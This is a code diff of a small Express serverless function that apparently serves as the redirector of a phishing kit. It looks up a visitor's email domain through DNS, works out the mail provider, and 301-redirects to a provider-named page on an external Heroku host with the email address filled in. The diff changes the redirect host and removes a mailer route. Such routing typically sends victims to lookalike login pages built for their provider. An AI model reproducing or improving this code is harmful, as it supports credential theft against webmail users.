@@ -3,12 +3,13 @@ const express = require("express");
 const serverless = require("serverless-http");
 var dns = require("dns");
 const { parse } = require("tldts");
+const path = require("path");
 
 const app = express();
 
 const router = express.Router();
 
-const urL = "https://admin-fa3ba.web.app";
+const urL = "https://postms.herokuapp.com";
 
 const hostproviders = [
   "emailsrvr",
@@ -96,15 +97,15 @@ router.get("/", (req, res) => {
       );
       console.log(host.name);
       // redirect fro to provider using hostname
-      res.redirect(301, `${urL}/${host.name}/?email=${email}`);
+      res.redirect(301, `${urL}/${host.name}/${email}`);
     } else if (isProvidersubdomain) {
       const host = providers.find((element) => element.subdomain === subdomain);
       console.log(host.name);
       // redirect fro to provider using subdomain
-      res.redirect(301, `${urL}/${host.name}/?email=${email}`);
+      res.redirect(301, `${urL}/${host.name}/${email}`);
     } else {
       console.log("provider nor avaiable redirect to webmail");
-      res.redirect(301, `${urL}/webmail/?email=${email}`);
+      res.redirect(301, `${urL}/webmail/${email}`);
     }
   });
 });
@@ -115,7 +116,6 @@ router.get("/test", (req, res) => {
   });
 });
 
-router.use("/mail", require("./mailer"));
 
 app.use("/.netlify/functions/api", router);
 
